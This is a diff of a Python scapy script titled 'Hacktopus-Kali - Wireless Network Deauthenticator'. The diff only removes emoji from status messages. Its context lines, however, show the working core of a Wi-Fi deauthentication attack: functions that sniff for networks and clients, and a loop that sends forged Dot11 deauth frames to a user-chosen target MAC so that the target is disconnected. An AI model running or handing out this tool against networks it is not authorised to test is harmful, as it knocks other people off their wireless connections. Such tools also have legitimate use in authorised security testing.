@@ -3,7 +3,7 @@ from scapy.layers.dot11 import Dot11, Dot11Deauth
 import time
 
 def deauth(target_mac, gateway_mac, interface):
-    print("\n🔍 Sending deauthentication packets...")
+    print("\n Sending deauthentication packets...")
     
     #deauth packet
     dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
@@ -15,7 +15,7 @@ def deauth(target_mac, gateway_mac, interface):
         time.sleep(1)
 
 def scan_network(interface):
-    print("\n🔍 Scanning networks to find BSSID and clients...")
+    print("\n Scanning networks to find BSSID and clients...")
     
     scapy.sniff(iface=interface, prn=handle_packet, timeout=10)
 
@@ -26,7 +26,7 @@ def handle_packet(packet):
         print(f"Found Wi-Fi network: SSID: {ssid} BSSID: {bssid}")
 
 def main():
-    print("🎩 Hacktopus-Kali - Wireless Network Deauthenticator")
+    print("Hacktopus-Kali - Wireless Network Deauthenticator")
     interface = input("Enter the interface for Wi-Fi (e.g., wlan0): ")
     scan_network(interface)
     target_mac = input("Enter the target MAC address to disconnect: ")
